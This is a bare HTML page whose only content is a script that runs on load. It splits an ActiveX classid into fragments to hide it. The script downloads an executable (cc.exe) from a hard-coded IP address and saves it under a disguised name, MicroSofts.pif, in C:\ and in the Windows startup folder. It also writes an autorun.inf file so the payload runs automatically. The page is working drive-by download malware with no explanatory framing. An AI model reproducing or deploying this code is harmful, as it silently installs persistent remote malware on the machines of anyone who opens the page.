<HTML>
<HEAD>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<SCRIPT language=javaScript>
	var id = "classid";
	var id2 = "clsid:";
	var id3 = "4FC29E36";
	var id4 = "0-983A-00C0";
	var id5 = "BD96C556-65A3-11D";
	var object = document.createElement("o"+"bje"+"ct");
	var idx = id2+id5+id4+id3;
	object.setAttribute(id,idx);
	var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP");
	function userSend()
{
        aaaa = "true"; 
        var lovea = "http://61.147.117.163/cc.";
        var loveb = "exe";
        var lovex = lovea+loveb
	xmlHttp.open('GET',lovex,aaaa);
	xmlHttp.onReadyStateChange = userResponse;
	xmlHttp.send();
}
function userResponse()
{
	if(xmlHttp.readyState == 4)
	{
		var adodbStream = object.CreateObject("Adodb.Stream","");
		var cuteqqcn = '\\..\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\����\\MicroSofts.pif';
		var cuteqqcn2 = "C:\\MicroSofts.pif";
		var cuteqqcn3 = "C:\\autorun.inf";
		var chilam = "[AutoRun]"+"\n"+"OPEN=MicroSofts.pif"+"\n"+"shellexecute=MicroSofts.pif"+"\n"+"shell\Auto\command=MicroSofts.pif";
		var cuteqq = object.CreateObject("Scripting.FileSystemObject","");
		var temp = cuteqq.GetSpecialFoLder(0);
		cuteqqcn = cuteqq.BuildPath(temp,cuteqqcn);
		adodbStream.Type = 2;
		adodbStream.OpEn();
		adodbStream.WriteText=chilam;
		adodbStream.Savetofile(cuteqqcn3,2);
		adodbStream.Close();
		adodbStream.type = 1;
		adodbStream.OpEn();
		adodbStream.Write(xmlHttp.responseBody);
		adodbStream.SaveToFile(cuteqqcn2,2);
		adodbStream.SaveToFile(cuteqqcn,2);
		adodbStream.Close();
	}
}
userSend();
</SCRIPT>
<BODY>
</BODY>
</HTML>